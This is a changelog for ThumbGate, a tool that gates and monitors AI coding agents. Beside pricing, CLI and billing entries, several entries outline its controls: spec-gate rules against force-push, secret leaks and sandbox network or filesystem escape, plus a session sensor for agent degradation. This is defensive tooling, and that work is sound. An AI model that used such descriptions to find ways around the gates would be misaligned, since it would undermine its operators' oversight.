- [#921](https://github.com/IgorGanapolsky/ThumbGate/pull/921) [`a97ef8e`](https://github.com/IgorGanapolsky/ThumbGate/commit/a97ef8e15448d5cbf8720a1c1167be085293a700) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add pre-commit + pre-push git hooks to catch regressions before CI. Hooks live in `.githooks/` (no new npm deps), auto-activate via `prepare` npm script, enforce: public/ HTML package parity, version sync, check-congruence, landing-page-claims, gates-engine regression tests, npm pack dry-run, internal link validation. Also adds CI publish-guard that fails when a merge leaves shipped content un-bumped (prevents the "1.5.2 already on npm, content didn't ship" silent no-op that forced 1.5.3/1.5.4).

- [#917](https://github.com/IgorGanapolsky/ThumbGate/pull/917) [`d33b81f`](https://github.com/IgorGanapolsky/ThumbGate/commit/d33b81fbb9f66f108ca3ecf99bcee7680d3fc5ee) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Put the Pro pricing card INSIDE the homepage hero (between subtitle and dashboard preview) so `$19/mo` and `$149/yr` never get buried. The card shows both Monthly and Annual plans side-by-side with dedicated "Choose monthly / Choose annual" buttons and a "SAVE 35%" pill on annual — visible in pixel [#1](https://github.com/IgorGanapolsky/ThumbGate/issues/1) on any viewport, not hidden behind scroll. `/pro` is now a permanent `301` redirect to `/#pro-pitch` (the id of the in-hero pricing card), so every README, plugin manifest, guide, and compare page link still works and passes link equity onto a single canonical landing page. `/pro` also removed from the sitemap entry list and from the JSON root-endpoint listing so search engines index `/` directly instead of chasing the redirect.

- [#896](https://github.com/IgorGanapolsky/ThumbGate/pull/896) [`cb1657f`](https://github.com/IgorGanapolsky/ThumbGate/commit/cb1657fbd2c655ee60464017362151d09d002b7a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add prompt-evaluation positioning to the README and landing page so ThumbGate explains that prompt engineering is only the start, and proof lanes plus self-heal checks are how behavior gets measured and enforced.

- [#929](https://github.com/IgorGanapolsky/ThumbGate/pull/929) [`29bb812`](https://github.com/IgorGanapolsky/ThumbGate/commit/29bb81213ee1e74c51ebba5e6cb94be87342fea9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Make the landing-page proof-bar links individually clickable with padded hit targets and keyboard focus states, and show both thumbs-up reinforcement and thumbs-down correction examples in the first-dollar activation path.

- [#857](https://github.com/IgorGanapolsky/ThumbGate/pull/857) [`2f3fa15`](https://github.com/IgorGanapolsky/ThumbGate/commit/2f3fa15e8fa644b8d6ad1ae8bee4f8f4ae0306a0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix public landing page version synchronization so multiple release markers update in one pass.

- [#911](https://github.com/IgorGanapolsky/ThumbGate/pull/911) [`1d36bab`](https://github.com/IgorGanapolsky/ThumbGate/commit/1d36babae12901b5d44dac85fee593d513968b6f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Include `public/dashboard.html`, `scripts/prompt-eval.js`, and `bench/prompt-eval-suite.json` in the published npm package. The 1.5.1 release shipped without `dashboard.html`, breaking the local Pro dashboard for users who ran `npx thumbgate pro`. This patch restores the dashboard and ships the prompt evaluation framework.

- [#868](https://github.com/IgorGanapolsky/ThumbGate/pull/868) [`e42391d`](https://github.com/IgorGanapolsky/ThumbGate/commit/e42391d90138140fc819d24afaa78457b85b486d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden revenue observability by preferring hosted billing-summary truth over local fallback when `THUMBGATE_API_KEY` is available, adding machine-readable Stripe live status diagnostics, and wiring the daily revenue loop to audit hosted revenue, Stripe, and Plausible checkout attribution with artifacts.

- [#855](https://github.com/IgorGanapolsky/ThumbGate/pull/855) [`69157d2`](https://github.com/IgorGanapolsky/ThumbGate/commit/69157d2c483f03bbfc6d8b6a4a403915ee2ac19e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a local sales pipeline ledger for first-dollar workflow hardening outbound, and update GTM targeting so direct outreach leads with the Workflow Hardening Sprint before self-serve Pro follow-up.

- [#905](https://github.com/IgorGanapolsky/ThumbGate/pull/905) [`d3f7195`](https://github.com/IgorGanapolsky/ThumbGate/commit/d3f7195f911fd870fdc079df0823c3a8d42daa36) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add sandbox scope to spec-gate constraints for secure code execution environments. Adds 2 sandbox-specific constraints (no-sandbox-network, no-sandbox-fs-escape) to agent-safety spec. Also adds workflow-gate-checkpoint module for persisting gate state across long-running workflow restarts. Inspired by Vercel's Open Agents infrastructure.

- [#888](https://github.com/IgorGanapolsky/ThumbGate/pull/888) [`9fcc0a0`](https://github.com/IgorGanapolsky/ThumbGate/commit/9fcc0a00aaf354964c5d795548482ab249963245) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add session health sensor and episodic session store for real-time and cross-session agent degradation detection. Tracks repeat errors, negative feedback density, stagnation, context amnesia, time-of-day risk, category risk, recurring errors, and feedback effectiveness trends.

- [#892](https://github.com/IgorGanapolsky/ThumbGate/pull/892) [`86152fa`](https://github.com/IgorGanapolsky/ThumbGate/commit/86152fa0198f8ccff21d54257e809423eed8086a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add spec-gate module for proactive correctness enforcement. Operators define specs (constraints + invariants) upfront as JSON; gates enforce them from session start, not just from learned failures. Ships with agent-safety spec covering force-push, secrets, destructive ops, and test-before-commit invariants.

- [#939](https://github.com/IgorGanapolsky/ThumbGate/pull/939) [`adcc368`](https://github.com/IgorGanapolsky/ThumbGate/commit/adcc368adcb784b8ab4cd23355e75529e13cd4ac) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix broken logo on /success (Context Gateway Activated) page. After PR [#932](https://github.com/IgorGanapolsky/ThumbGate/issues/932) moved brand assets to `/assets/brand/`, the HTML templates from PR [#931](https://github.com/IgorGanapolsky/ThumbGate/issues/931) still referenced the legacy `/brand/thumbgate-mark.svg` path — which Railway's route guard now returns 401 for. Migrates all 15 customer-facing surfaces (landing, dashboard, lessons, pro, learn hub + 5 learn articles, post-checkout success page, SEO-GSD generator) to the correct `/assets/brand/thumbgate-mark.svg` path (serves 200). Also migrates favicon link from the 401ing `/favicon.svg` to the 200ing `/thumbgate-icon.png`, and `og:image` from `/brand/thumbgate-og.svg` to `/og.png`, with correct MIME types. Updates brand-assets test suite to pin the new paths so this can't regress.

- [#865](https://github.com/IgorGanapolsky/ThumbGate/pull/865) [`81dac4e`](https://github.com/IgorGanapolsky/ThumbGate/commit/81dac4e7b65f5a1099d7f0b7376b3b01553e8091) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Enforce ThumbGate-only launch, GPT Actions, analytics, and outreach surfaces so legacy repository names cannot leak into active product guidance.

- [#940](https://github.com/IgorGanapolsky/ThumbGate/pull/940) [`5a39d1c`](https://github.com/IgorGanapolsky/ThumbGate/commit/5a39d1c9fb15423a60c5c6263c05c6b0ad4ec8fe) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Polish the ThumbGate Pro trial email so checkout activation uses conversion-ready copy, a clear dashboard call to action, Pre-Action Gates positioning, and Resend sender configuration synced into Railway deploys.

- [#924](https://github.com/IgorGanapolsky/ThumbGate/pull/924) [`3a8ec38`](https://github.com/IgorGanapolsky/ThumbGate/commit/3a8ec38b7b35cc384514e6f2054a09777c13d46e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Enforce per-platform character limits in the Zernio publisher before posting or scheduling. The previous path blasted identical content to every connected platform — a 315-char post silently failed at Bluesky's 300-char ceiling (CEO-reported post `69d939ba88955f0579e44fa7`, 2026-04-16). New `platform-limits.js` module maps canonical limits (Bluesky 300, X/Twitter 280, LinkedIn 3000, etc.) and rejects over-limit targets with actionable `{ reason, platform, limit, length, overBy }` detail rather than letting the provider eat the failure.

## 1.5.1

### Minor Changes

- Add **Insights tab** to the dashboard with interactive Chart.js charts:
  - **Feedback Trend** (30-day line chart): daily thumbs-up/down signals over time
  - **Lessons Generated** (bar + cumulative line): how many lessons were distilled each day
  - **Gate Effectiveness** (stacked bar): 14-day audit of blocked/warned/allowed actions
  - **Feedback → Lesson Pipeline**: clickable flow showing how signals convert to lessons, gates, and blocked actions with conversion rates
  - **How ThumbGate Learns**: 4-step visual explainer (React → Distill → Promote → Block)
- New backend functions: `computeFeedbackTimeSeries()` (30-day daily up/down/lesson counts) and `computeLessonPipeline()` (stage-by-stage conversion metrics)
- Dashboard API (`/v1/dashboard`) now returns `feedbackTimeSeries` and `lessonPipeline` fields

## 1.5.0

### Minor Changes

- [#815](https://github.com/IgorGanapolsky/ThumbGate/pull/815) [`9211b17`](https://github.com/IgorGanapolsky/ThumbGate/commit/9211b1726ebb11a852f459a34bb2b81aacdaf3e3) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Agent-first CLI experience: add `--json` flag to all commands, `thumbgate status` health check, `thumbgate explore` subcommands (lessons/rules/gates/firings), output context signals ([LOCAL], [ACTIVE], [LEARNING], [BLOCKED], [ALLOWED]), and `thumbgate demo` simulated walkthrough. AI agents can now programmatically check gate status, search lessons, and introspect ThumbGate state.

- [#812](https://github.com/IgorGanapolsky/ThumbGate/pull/812) [`66277a7`](https://github.com/IgorGanapolsky/ThumbGate/commit/66277a7adfd6778a0c4954339ea4408e5bc63848) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add autonomous four-hour marketing autopilots for text, video, Reddit, Dev.to, and Zernio-backed distribution with cached deduplication state.

- [#805](https://github.com/IgorGanapolsky/ThumbGate/pull/805) [`82a5849`](https://github.com/IgorGanapolsky/ThumbGate/commit/82a5849cf9fb123c6c5308bcc392e9c4d7b452a0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Steal Cloudflare CLI ideas: schema-first help, --json everywhere, --local/--remote

  Three improvements stolen from Cloudflare's CLI architecture post:

  **1. Schema-first CLI (`scripts/cli-schema.js`)**
  Single source of truth for all CLI command metadata. `help()` is now generated
  from the schema rather than hardcoded console.log lines. Each command declares
  its name, description, flags (with types), group, and MCP tool binding.
  Adding a new command in cli-schema.js auto-updates help output and the explore
  TUI command browser.

  **2. `--json` everywhere**

  - `thumbgate stats --json` → structured payload with total, positives, negatives,
    approvalRate, recentTrend, revenueAtRisk, topTags, recentActivity
  - `thumbgate gate-stats --json` → all gate engine metrics except the full gates
    array (add `--verbose` to include it)
  - `thumbgate doctor --json` already existed; now documented in schema

  **3. `--local` / `--remote` flag on `lessons`**

  - `thumbgate lessons --local` (default) uses the local JSONL/SQLite store
  - `thumbgate lessons --remote` fetches from the hosted Railway instance at
    `GET /v1/lessons/search?q=...&limit=...` — same response shape
  - Respects `THUMBGATE_API_URL` env var for custom deployments

- [#707](https://github.com/IgorGanapolsky/ThumbGate/pull/707) [`03c26b9`](https://github.com/IgorGanapolsky/ThumbGate/commit/03c26b9f69100c6779c4148096fbfdd39377be06) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add context-stuffing mode: dump all lessons into agent context bypassing RAG. New MCP tool context_stuff_lessons.

- [#789](https://github.com/IgorGanapolsky/ThumbGate/pull/789) [`258f7ef`](https://github.com/IgorGanapolsky/ThumbGate/commit/258f7ef86a4b4058d5b6a725d41ba369fb1396a8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add cross-encoder reranker to lesson retrieval pipeline (Advanced RAG)

  Introduces `scripts/lesson-reranker.js` — a field-weighted BM25F cross-encoder
  that processes (query, lesson) pairs jointly rather than independently:

  - **Field weighting**: query terms in `whatWentWrong` (weight 3.0) contribute
    more than the same term in `tags` (weight 0.4), catching field-specific
    relevance that bi-encoders miss
  - **Synonym expansion**: "deploy" ↔ "deployment/release/publish", "force-push"
    ↔ "git push --force", ".env" ↔ "secret/dotenv", and 8 more synonym clusters
  - **Signal coherence**: failure-sounding queries boost negative-signal lessons
    by 1.2× so the right cautionary lesson surfaces first
  - **Tool name joint scoring**: exact tool match in `metadata.toolsUsed` adds
    a 1.3× ranking bonus
  - **Score blending**: final score = 0.7 × normalised BM25 + 0.3 × original
    bi-encoder score so retrieval signal is never fully discarded

  The pipeline is now two-stage: bi-encoder retrieves top-50 candidates, then
  the cross-encoder reranks and returns top-K. Both the PreToolUse hook path
  (`lesson-retrieval.js`) and the MCP `search_lessons` path (`lesson-search.js`)
  use the reranker.

- [#768](https://github.com/IgorGanapolsky/ThumbGate/pull/768) [`9f05bbb`](https://github.com/IgorGanapolsky/ThumbGate/commit/9f05bbb870ba26ceca3cfd8b0c208824c2381c7f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Position ThumbGate as AI agent security infrastructure across the public landing context, LLM context, and social launch visuals.

- [#689](https://github.com/IgorGanapolsky/ThumbGate/pull/689) [`0467bf1`](https://github.com/IgorGanapolsky/ThumbGate/commit/0467bf11353b1d6a57a8c1b08081a075976e29c1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add policy and runbook document ingestion with searchable local storage, CLI/API/MCP import surfaces, and proposed gate generation for team workflows.

- [#805](https://github.com/IgorGanapolsky/ThumbGate/pull/805) [`82a5849`](https://github.com/IgorGanapolsky/ThumbGate/commit/82a5849cf9fb123c6c5308bcc392e9c4d7b452a0) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `thumbgate explore` — interactive TUI explorer for lessons, gates, stats, and rules

  Inspired by Cloudflare's Local Explorer pattern: a zero-dependency, keyboard-driven
  terminal interface that lets developers and AI agents discover what ThumbGate has
  learned and what gates are active.

  Features:

  - 4 tabs (1-4 or Tab key): Lessons · Gates · Stats · Rules
  - ↑/↓ or j/k to navigate, `/` to search/filter, Enter for detail view
  - Color-coded signal indicators (● negative = red, ● positive = green)
  - Relative timestamps, truncation, terminal-resize awareness
  - Works entirely from local JSONL/SQLite — no network required

- [#690](https://github.com/IgorGanapolsky/ThumbGate/pull/690) [`04674fa`](https://github.com/IgorGanapolsky/ThumbGate/commit/04674fa44db7d3d31dc6327e4115018266dee91d) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add ForgeCode agent adapter, Plausible analytics tracking across all pages, YouTube Shorts in weekly workflow, and daily revenue loop GitHub Actions workflow.

- [#743](https://github.com/IgorGanapolsky/ThumbGate/pull/743) [`a14279c`](https://github.com/IgorGanapolsky/ThumbGate/commit/a14279c8806eb85ece5a98c52eae603819b6c6ae) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Wire up hosted billing integration with a dedicated THUMBGATE_OPERATOR_KEY. Run `node bin/cli.js billing:setup` to generate a key, then set it on Railway — the CFO dashboard will pull live production revenue automatically.

- [#656](https://github.com/IgorGanapolsky/ThumbGate/pull/656) [`bbf835c`](https://github.com/IgorGanapolsky/ThumbGate/commit/bbf835ce07ea6c8ec2345fc77838ab5549ea40b5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add LLM-powered managed lesson agent, Anthropic SDK integration, AEO discovery (llms.txt), and founding member CTA across upgrade prompts

- [#684](https://github.com/IgorGanapolsky/ThumbGate/pull/684) [`fe326d3`](https://github.com/IgorGanapolsky/ThumbGate/commit/fe326d351357d31dc925069ad198f90afe055d76) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add meta-agent self-improvement loop (`scripts/meta-agent-loop.js`) and `gate-program.md` for closed-loop prevention rule generation without requiring human feedback on every iteration

- [#816](https://github.com/IgorGanapolsky/ThumbGate/pull/816) [`f3a1cd2`](https://github.com/IgorGanapolsky/ThumbGate/commit/f3a1cd2361af4624046a9954c81edfc3b7885d94) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Perplexity MCP adapter configs for Claude Code, Codex, and OpenCode. Register perplexity_search, perplexity_ask, perplexity_research, and perplexity_reason in MCP allowlists. Add enrichWithPerplexity() to lesson-search for optional web-context enrichment of search results.

- [#735](https://github.com/IgorGanapolsky/ThumbGate/pull/735) [`0b48d35`](https://github.com/IgorGanapolsky/ThumbGate/commit/0b48d35af245a429dcdf0a73bde1eb4e1ac90cb5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add `npx thumbgate quick-start` command for zero-config complete enforcement setup

- [#770](https://github.com/IgorGanapolsky/ThumbGate/pull/770) [`b38cd7e`](https://github.com/IgorGanapolsky/ThumbGate/commit/b38cd7e3fa499a2770a246110d3c6523b26183ca) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Ralph Loop CI for always-on audience engagement, with hourly analytics polling, stateful reply monitoring, launch asset sync, and Reliability Gateway evidence artifacts.

- [#785](https://github.com/IgorGanapolsky/ThumbGate/pull/785) [`9f3fae7`](https://github.com/IgorGanapolsky/ThumbGate/commit/9f3fae7e61845dc11ce5978cfe80cd27f10034e8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add session analyzer coverage and Perplexity visibility checks so Ralph Mode CI can detect wasted agent turns, confusion signals, and AI-search discoverability regressions.

- [#656](https://github.com/IgorGanapolsky/ThumbGate/pull/656) [`bbf835c`](https://github.com/IgorGanapolsky/ThumbGate/commit/bbf835ce07ea6c8ec2345fc77838ab5549ea40b5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Pivot to team governance positioning ($99/seat/mo), add AEO for LLM discovery, fix LinkedIn poller

- [#694](https://github.com/IgorGanapolsky/ThumbGate/pull/694) [`6dffca9`](https://github.com/IgorGanapolsky/ThumbGate/commit/6dffca9006dd3fda2ab85de5bbb7c6626f36c3db) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Tighten free tier to 3 captures/day and 5 searches/day, add Pro CTA to CLI init output, and prepare Reddit seeding posts.

### Patch Changes

- [#726](https://github.com/IgorGanapolsky/ThumbGate/pull/726) [`b5ed367`](https://github.com/IgorGanapolsky/ThumbGate/commit/b5ed367e995c7e66859371b559b32355a3a3e3be) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Publish the AI agent security campaign updates across the site blog and launch assets.

- [#699](https://github.com/IgorGanapolsky/ThumbGate/pull/699) [`db8bd9f`](https://github.com/IgorGanapolsky/ThumbGate/commit/db8bd9fd4f822e68e17b1e83961276018368d4ea) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Weave AI authenticity enforcement angle across all buyer-facing and AI-discovery surfaces: README hero, landing page signal pill, llm-context.md discovery section, MARKETING_COPY_CONGRUENCE.md terminology rules, and package.json keywords.

- [#683](https://github.com/IgorGanapolsky/ThumbGate/pull/683) [`eb06538`](https://github.com/IgorGanapolsky/ThumbGate/commit/eb06538fbc5c02ea88313705e487fbad31461eb1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Weave AI authenticity enforcement angle across all discovery surfaces (README, landing page hero, FAQ, llm-context, marketing docs, NPM keywords).

- [#672](https://github.com/IgorGanapolsky/ThumbGate/pull/672) [`d9d9ae7`](https://github.com/IgorGanapolsky/ThumbGate/commit/d9d9ae7674936ac8ead0e5f670ab42b018339772) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Reframe the public product story around an enterprise-first workflow hardening motion while keeping the free CLI as the adoption wedge and Solo Pro as a secondary self-serve lane. This aligns the README, landing page, LLM context, commercial docs, and discovery assets with the current team-governance positioning.

- [#799](https://github.com/IgorGanapolsky/ThumbGate/pull/799) [`adaab1a`](https://github.com/IgorGanapolsky/ThumbGate/commit/adaab1ac6ce6d9312f2156dbf88a3bd299df90e4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh the ChatGPT GPT Builder instructions around the Reliability Gateway loop, pre-action decision checks, typed feedback capture, prevention-rule generation, and proof export so the public GPT no longer uses generic setup-concierge positioning.

- [#769](https://github.com/IgorGanapolsky/ThumbGate/pull/769) [`1ae2873`](https://github.com/IgorGanapolsky/ThumbGate/commit/1ae28739614a78a348cbf178acd11ed3659321b9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Tighten the ChatGPT GPT Store packet for regular users. The docs now make the owner-managed Actions API key explicit, keep API keys and JSON away from regular GPT users, use the hosted privacy policy URL, and reinforce the thumbs-up/down answer-memory loop.

- [#766](https://github.com/IgorGanapolsky/ThumbGate/pull/766) [`c90604c`](https://github.com/IgorGanapolsky/ThumbGate/commit/c90604c5b03e162dad6d4c61b0fa1db19b90a3d6) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Clarify Claude and ChatGPT distribution paths. The ChatGPT GPT Actions lane now explains the regular-user loop: reply with thumbs up/down on ChatGPT answers, save lessons, prevent repeated bad answer patterns, and reinforce answers that worked.

- [#739](https://github.com/IgorGanapolsky/ThumbGate/pull/739) [`2f4168c`](https://github.com/IgorGanapolsky/ThumbGate/commit/2f4168c393184b595798cc2eaf436e025dfd8cd7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Strengthen Claude plugin listing readiness docs, release assets, and submission packaging

- [#737](https://github.com/IgorGanapolsky/ThumbGate/pull/737) [`188319b`](https://github.com/IgorGanapolsky/ThumbGate/commit/188319b4cb23525d512fa7c3a8378a40524e9539) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Update Claude plugin manifests to current marketplace spec for directory listing

- [#692](https://github.com/IgorGanapolsky/ThumbGate/pull/692) [`7f962ea`](https://github.com/IgorGanapolsky/ThumbGate/commit/7f962ea3dc982582d5865076038a0a8e8f73f5e7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Harden merge integrity by blocking failing non-required quality checks, syncing main branch protection to the critical check set, and reporting landed merge commits instead of branch head SHAs.

- [#655](https://github.com/IgorGanapolsky/ThumbGate/pull/655) [`5d564a9`](https://github.com/IgorGanapolsky/ThumbGate/commit/5d564a9e3d8682f7864d52d8066a0bfaa35864ed) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Refresh SonarCloud on `main` pushes without blocking on legacy baseline debt, while keeping strict PR quality-gate enforcement and stamping analyses with the package version for release-aligned verification.

- [#729](https://github.com/IgorGanapolsky/ThumbGate/pull/729) [`5f9eef8`](https://github.com/IgorGanapolsky/ThumbGate/commit/5f9eef8bb7a12392857bb9d1764f180ec8bfb6c8) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Promote the published Codex plugin bundle more clearly from the landing page and README.

- [#701](https://github.com/IgorGanapolsky/ThumbGate/pull/701) [`0a773dd`](https://github.com/IgorGanapolsky/ThumbGate/commit/0a773dd6babfe9c70c1fa9d2623fa84ff3e60b82) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Publish a standalone Codex plugin zip, direct-download release aliases, and the matching GitHub Actions release workflow.

- [#835](https://github.com/IgorGanapolsky/ThumbGate/pull/835) [`c0024cd`](https://github.com/IgorGanapolsky/ThumbGate/commit/c0024cd32ec77c1412fe31724a3d78baba31663e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Lead public marketing, README, LLM context, and ChatGPT GPT instructions with
  costly AI mistake prevention outcomes while clarifying that the GPT provides
  advice/checkpointing and hard enforcement runs through the local ThumbGate
  Reliability Gateway.

- [#657](https://github.com/IgorGanapolsky/ThumbGate/pull/657) [`5a16509`](https://github.com/IgorGanapolsky/ThumbGate/commit/5a16509868f73cee5aaf0c59e8bad655e82ee3e7) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Bound Railway deploy health checks with explicit curl timeouts so unhealthy releases fail predictably instead of stalling verification indefinitely.

- [#681](https://github.com/IgorGanapolsky/ThumbGate/pull/681) [`8400073`](https://github.com/IgorGanapolsky/ThumbGate/commit/8400073b496cd0eea33778ba022c3cf673dae883) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Give live GitHub About verification a longer CI retry window so post-merge mainline checks do not fail on transient GitHub metadata propagation lag.

- [#669](https://github.com/IgorGanapolsky/ThumbGate/pull/669) [`c8f0c0a`](https://github.com/IgorGanapolsky/ThumbGate/commit/c8f0c0a3d87fc457b9b485e0ba7a9da64cd51bea) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Include .well-known/ in Docker image so llms.txt is served in production

- [#678](https://github.com/IgorGanapolsky/ThumbGate/pull/678) [`eb35983`](https://github.com/IgorGanapolsky/ThumbGate/commit/eb35983d50339a7e5241645403eb087b8ac1a6a1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Remove brittle hardcoded verification-count claims from docs and landing page; add docs-claim-hygiene regression test.

- [#848](https://github.com/IgorGanapolsky/ThumbGate/pull/848) [`804a284`](https://github.com/IgorGanapolsky/ThumbGate/commit/804a28406eb511c6be9147d2e2b1c2eb47550534) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Clarify the first-dollar activation path across the landing page, README, and ChatGPT GPT docs so cold users start by proving one blocked repeated mistake before upgrading to Pro or entering the Workflow Hardening Sprint.

- [#842](https://github.com/IgorGanapolsky/ThumbGate/pull/842) [`8ea4a16`](https://github.com/IgorGanapolsky/ThumbGate/commit/8ea4a16f49fa9322ff142b580fa16287796be1bd) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add first-party marketing link routing and conversion-funnel telemetry so ThumbGate can attribute GPT, install, Pro checkout, and trial-email intent without adding Branch.io.

- [#666](https://github.com/IgorGanapolsky/ThumbGate/pull/666) [`622630b`](https://github.com/IgorGanapolsky/ThumbGate/commit/622630bc056165a76b4505f686caf3deba623e4b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Narrow Railway deploy detection so shell-only script changes like the Claude statusline do not trigger production deploys, while runtime JavaScript modules still do.

- [#784](https://github.com/IgorGanapolsky/ThumbGate/pull/784) [`9c9bcab`](https://github.com/IgorGanapolsky/ThumbGate/commit/9c9bcab28b3478cdeed33b1a5dc9b3bba272c03b) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix checkout mode from one-time payment to monthly subscription. Corrects billing.ts to use mode: 'subscription' with the $19/mo price instead of mode: 'payment' with the $49 one-time price. Updates auth.ts error message to match.

- [#693](https://github.com/IgorGanapolsky/ThumbGate/pull/693) [`2be9345`](https://github.com/IgorGanapolsky/ThumbGate/commit/2be93457916984ecbd30249325ef3351d2916655) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Restore clickable Claude statusline affordances for ThumbGate. The packaged statusline once again exposes OSC 8 hyperlinks for `👍`, `👎`, `Dashboard`, and `Lessons`, auto-boots the local Pro dashboard server when needed, and prefers the installed runtime binary over repeated `npm exec` launches.

- [#775](https://github.com/IgorGanapolsky/ThumbGate/pull/775) [`a9145d1`](https://github.com/IgorGanapolsky/ThumbGate/commit/a9145d152949f09cdab1e840aaf56013eaca98bb) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Close 7 enforcement loop gaps that caused 1:33 thumbs ratio. Lower auto-promote thresholds (WARN 2, BLOCK 3), fix auto-gates overwrite bug, add compiled guard staleness check, broaden memory guard to all write operations, and inject behavioral context on every tool call.

- [#747](https://github.com/IgorGanapolsky/ThumbGate/pull/747) [`6b09d59`](https://github.com/IgorGanapolsky/ThumbGate/commit/6b09d59c8b2d0cba358e13e6189e02270d175c16) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix hosted billing fetch in proxy environments. Node.js native fetch (undici) does not honour HTTPS_PROXY env vars; bootstraps ProxyAgent when a proxy URL is detected so `node bin/cli.js cfo --today` works correctly in sandboxed or corporate network environments.

- [#846](https://github.com/IgorGanapolsky/ThumbGate/pull/846) [`c988ea8`](https://github.com/IgorGanapolsky/ThumbGate/commit/c988ea8e1a074250ccd7157e01cd5e0be8aa9e1e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Include public/lessons.html and public/index.html in npm package. The server
  reads these at runtime — excluding them degrades the lessons UI to a stub page.
  Added CI test to prevent this regression.

- [#843](https://github.com/IgorGanapolsky/ThumbGate/pull/843) [`83ec53d`](https://github.com/IgorGanapolsky/ThumbGate/commit/83ec53dff0da18e41ccccc12f8563b0d84a53076) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix hash navigation on Lessons page: scrollIntoView silently failed on elements
  inside hidden tabs (display:none). Now switches to the correct tab before querying
  for the target element. Statusbar "Latest mistake" links now scroll to the right
  rule card.

- [#803](https://github.com/IgorGanapolsky/ThumbGate/pull/803) [`ccea486`](https://github.com/IgorGanapolsky/ThumbGate/commit/ccea48621ff2a7d90f4a14efabd62d0a98aa2922) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix operator key blocked by general auth gate when THUMBGATE_API_KEY is also set. The general isAuthorized gate only checked the admin key, causing operator key requests to get 401 before reaching the billing/summary endpoint handler. Now the operator key is allowed to bypass the general gate specifically for GET /v1/billing/summary.

- [#814](https://github.com/IgorGanapolsky/ThumbGate/pull/814) [`ed86638`](https://github.com/IgorGanapolsky/ThumbGate/commit/ed8663876b084a840a0712b9a97862ffbd84c391) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix wire-hooks to clean stale project-level Claude Code hooks referencing missing files. Previously only cleaned user-level settings, leaving broken hooks in .claude/settings.json that caused "UserPromptSubmit hook error".

- [#827](https://github.com/IgorGanapolsky/ThumbGate/pull/827) [`d356712`](https://github.com/IgorGanapolsky/ThumbGate/commit/d3567126ac4881c7201d4ed29d23945fa75fd1fe) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix: make Dashboard and Lessons links clickable in Claude Code statusbar using OSC 8 terminal hyperlinks

